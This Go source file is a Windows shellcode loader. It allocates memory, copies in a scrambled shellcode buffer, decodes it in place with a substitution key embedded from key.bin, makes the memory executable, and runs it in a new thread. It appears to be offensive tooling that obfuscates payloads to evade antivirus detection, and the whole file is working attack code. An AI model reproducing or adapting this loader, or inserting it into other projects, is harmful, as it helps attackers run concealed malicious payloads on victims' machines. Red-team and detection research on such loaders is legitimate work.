//go:build windows

package main

import (
	_ "embed"
	"fmt"
	"os"
	"unsafe"

	"github.com/mjwhitta/babble"
	"golang.org/x/sys/windows"
)

//go:generate goversioninfo -64

//go:embed key.bin
var keyBytes []byte

var bin string = "exe"

func check(e error) {
	if e != nil {
		if e.Error() != "The operation completed successfully." {
			panic(e)
		}
	}
}

func main() {
	var addr uintptr
	var e error
	var k *babble.Key
	var ntdll, kernel32 *windows.LazyDLL
	var rtlcopymemory, createthread *windows.LazyProc
	var oldprotect uint32
	var thread uintptr
	var event uint32

	addr, e = windows.VirtualAlloc(
		uintptr(0),
		uintptr(len(buf)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)
	check(e)
	if addr == 0 {
		fmt.Println("[!] Error calling VirtualAlloc, exiting...")
		os.Exit(1)
	}

	// Write the scrambled shellcode into memory
	ntdll = windows.NewLazySystemDLL("ntdll.dll")
	rtlcopymemory = ntdll.NewProc("RtlCopyMemory")
	_, _, e = rtlcopymemory.Call(
		addr,
		(uintptr)(unsafe.Pointer(&buf[0])),
		uintptr(len(buf)),
	)
	check(e)

	// Get the key bytes from the key bin file
	k, e = babble.NewKeyFromBytes(keyBytes, &babble.ByteMode{})
	check(e)

	// Loop through the scrambled shellcode in memory, and then
	// substitute each byte with the correct byte from the key,
	// all in place (in memory)
	for i := 0; i < len(buf); i++ {
		b := *(*byte)(unsafe.Pointer(addr + uintptr(i)))
		// a byte token is just an interface, in this case it is
		// just a byte. This is a simple substitution at the end of
		// the day
		b, _ = k.ByteFor(babble.NewByteToken(b)) 
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = b
	}

	e = windows.VirtualProtect(
		addr,
		uintptr(len(buf)),
		windows.PAGE_EXECUTE_READ,
		&oldprotect,
	)
	check(e)

	kernel32 = windows.NewLazySystemDLL("kernel32.dll")
	createthread = kernel32.NewProc("CreateThread")
	thread, _, e = createthread.Call(0, 0, addr, uintptr(0), 0, 0)
	check(e)

	event, e = windows.WaitForSingleObject(
		windows.Handle(thread),
		0xFFFFFFFF,
	)
	check(e)

	fmt.Printf("[+] WaitForSingleObject returned %d", event)
}
